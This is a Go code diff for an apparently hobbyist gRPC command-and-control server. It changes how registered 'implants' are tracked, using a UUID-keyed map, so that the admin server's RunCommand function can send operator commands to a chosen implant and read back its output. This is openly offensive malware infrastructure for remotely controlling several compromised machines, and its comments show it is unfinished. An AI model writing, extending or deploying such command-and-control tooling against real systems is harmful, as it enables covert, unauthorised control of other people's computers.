@@ -11,11 +11,9 @@ import (
 	"google.golang.org/grpc"
 )
 
-// empty array for UUID storage
-var uuid_list = []string{}
-
-// empty slice of implant server structs.
-var implant_list = []*implantServer{}
+// TODO: make this not in-memory, and instead be an indexable database.
+// gloablly accessable map for UUID's to implant structs
+var implant_map = map[string]implantServer{}
 
 /*It should be said, I think that these commands are invoked automatically, based on the RPC that was recieved, as the server decides what to do and when to do it. We don't invoke these explicitly, yet they are invoked.*/
 // create a struct for handling commands
@@ -72,15 +70,27 @@ func (s *implantServer) SendOutput(ctx context.Context, result *grpcapi.Command)
 	return &grpcapi.Empty{}, nil
 }
 
+// TODO:
+// edit the below function (I believe) to track and index for UUIDs. DONE!!!!
+//next thing that needs to be done is to default to sending the comand to ALL implants, or have some better default case then just failure.
+//for now, we have multiple implants, and can access each as we wish.
+
 // running of a command for our admin component; we push it to the Goroutine queue and have it be handled by multithreading.
 func (s *adminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) (*grpcapi.Command, error) {
 	var res *grpcapi.Command //assign res as a command struct
 	//set up goroutine, doing os in this way is a type of closure, and this goroutine can access cmd from outside this fucntion.
+
+	//grab UUID from cmd
+	uuidstr := cmd.GetUuid()
+
 	go func() {
-		s.work <- cmd
+		//s.work <- cmd
+		//try grabbing from the implant_map data structure
+		implant_map[uuidstr].work <- cmd
 	}()
 	//assign command output to result, ie telling us if it ran properly.
-	res = <-s.output
+	//res = <-s.output
+	res = <-implant_map[uuidstr].output
 	return res, nil
 }
 
@@ -94,14 +104,18 @@ func (s *implantServer) RegisterNewImplant(ctx context.Context, uuid_result *grp
 	fmt.Println(uuidstr)
 	fmt.Println("[+] Recieved new registration request")
 	//add uuid to the list that we have.
-	uuid_list = append(uuid_list, uuidstr)
-	implant_list = append(implant_list, s)
+	//uuid_list = append(uuid_list, uuidstr)
+	s.uuid = uuidstr
+	//implant_list = append(implant_list, *s)
+	implant_map[uuidstr] = *s
 	//try printing the data to make sure it actually went the wqay that was expected
 	fmt.Println("[+] Printing lists of registerd UUID's and implants:")
-	fmt.Printf("%+q", uuid_list)
-	fmt.Printf("%+q", implant_list)
-
-	//now, we have to add this to a database, or in this case an in-memeory array or something as a placeholder.
+	//fmt.Printf("%+q\n", uuid_list)    //works alright
+	fmt.Printf("%+q\n", implant_map)
+	fmt.Println("--------------------------------------------")
+	for key, value := range implant_map {
+		fmt.Println(key, value)
+	}
 	//return nil as I don't want to return something to the client.
 	return &grpcapi.Empty{}, nil
 }
@@ -152,6 +166,7 @@ func main() {
 	//use goroutines to serve implants
 	go func() {
 		grpcImplantServer.Serve(implantListener)
+		//grpcapi.RegisterImplantServer(grpcImplantServer, implant) //maybe??????
 	}()
 	//admin server is not multithreaded, only one is allowed.
 	grpcAdminServer.Serve(adminListener)
